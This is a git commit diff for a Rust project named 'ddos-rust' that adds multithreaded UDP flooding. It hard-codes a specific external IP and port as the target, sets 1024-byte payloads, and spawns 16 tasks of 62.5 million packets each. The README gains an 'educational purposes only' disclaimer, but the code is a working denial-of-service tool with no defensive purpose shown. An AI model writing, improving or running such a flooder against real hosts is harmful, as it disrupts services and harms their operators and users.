2e9d28a896c94b63a8f74607f8197deb5bc8d20a
Mateus Ferraz <108159617+Matt-Ferraz@users.noreply.github.com>
2024-03-21 00:36:12 -0300

    add multi thread

--- README.md
+++ README.md
@@ -1,1 +1,2 @@
 # ddos-rust
+this software is for educational purposes only, every and each use of this to harm anyone's network/server or any system is completely discouraged and not cool :(
--- src/main.rs
+++ src/main.rs
@@ -1,5 +1,5 @@
-use std::net::{SocketAddr, ToSocketAddrs};
-use std::sync::Arc;
+use std::net::SocketAddr;
+use std::sync::{Arc, atomic::{AtomicUsize, Ordering}};
 use tokio::net::UdpSocket;
 use tokio::sync::Mutex;
 use tokio::time::{self, Duration, Instant};
@@ -27,7 +27,7 @@ impl Stats {
     }
 
     fn success_rate(&self, duration: Duration) -> f64 {
-        self.successful_requests as f64
+        self.successful_requests as f64 / duration.as_secs_f64()
     }
 }
 
@@ -36,25 +36,36 @@ async fn make_udp_requests(
     message: &[u8],
     num_requests: usize,
     stats: Arc<Mutex<Stats>>,
+    counter: Arc<AtomicUsize>,
 ) -> Result<(), Box<dyn std::error::Error>> {
     let socket = UdpSocket::bind("0.0.0.0:0").await?;
     let mut interval = time::interval(Duration::from_secs(1));
     let start_time = Instant::now();
     let mut last_tick_time = start_time;
-    let mut stats_lock = stats.lock().await;
 
     for _ in 0..num_requests {
-        stats_lock.increment_total();
+        {
+            let mut stats_lock = stats.lock().await;
+            stats_lock.increment_total();
+        }
+        
         socket.send_to(message, &server_address).await?;
-        stats_lock.increment_successful();
+
+        {
+            let mut stats_lock = stats.lock().await;
+            stats_lock.increment_successful();
+        }
+
+        counter.fetch_add(1, Ordering::SeqCst);
 
         if Instant::now() - last_tick_time >= Duration::from_secs(1) {
             let elapsed_time = start_time.elapsed();
+            let mut stats_lock = stats.lock().await;
             println!(
-                "Success rate: {:} reqs in {:.2}",
-                stats_lock.success_rate(elapsed_time),
-                elapsed_time.as_secs_f64()
+                "Success rate: {:.2} reqs/s",
+                stats_lock.success_rate(elapsed_time)
             );
+            println!("Total requests: {}", counter.load(Ordering::SeqCst));
             last_tick_time = Instant::now();
         }
     }
@@ -63,30 +74,33 @@ async fn make_udp_requests(
 }
 
 #[tokio::main]
-async fn main() {
-    let server_address: SocketAddr = "ip:41234".parse().unwrap();
-    let message = b"Hell
-        o UDP Server";
-    let num_requests = 10000;
-    let num_instances = 10;
+async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let server_address: SocketAddr = "185.41.143.36:9223".parse()?;
+    let message = vec![0; 1024]; // Increase payload size to 1024 bytes
+    let num_requests_per_instance = 62500000;
+    let num_instances = 16;
     let stats = Arc::new(Mutex::new(Stats::new()));
+    let counter = Arc::new(AtomicUsize::new(0));
+
     let mut handles = vec![];
 
     for _ in 0..num_instances {
         let server_address = server_address.clone();
-        let message = message.to_vec();
+        let message = message.clone(); 
         let stats = stats.clone();
+        let counter = counter.clone();
+
         let handle = tokio::spawn(async move {
-            if let Err(err) = make_udp_requests(server_address, &message, num_requests, stats).await
-            {
-                eprintln!("Error: {}", err);
+            if let Err(err) = make_udp_requests(server_address, &message, num_requests_per_instance, stats, counter).await {
+                eprintln!("Server returned an error: {}", err);
             }
         });
         handles.push(handle);
     }
 
-    //
     for handle in handles {
-        let _ = handle.await;
+        handle.await?;
     }
+
+    Ok(())
 }
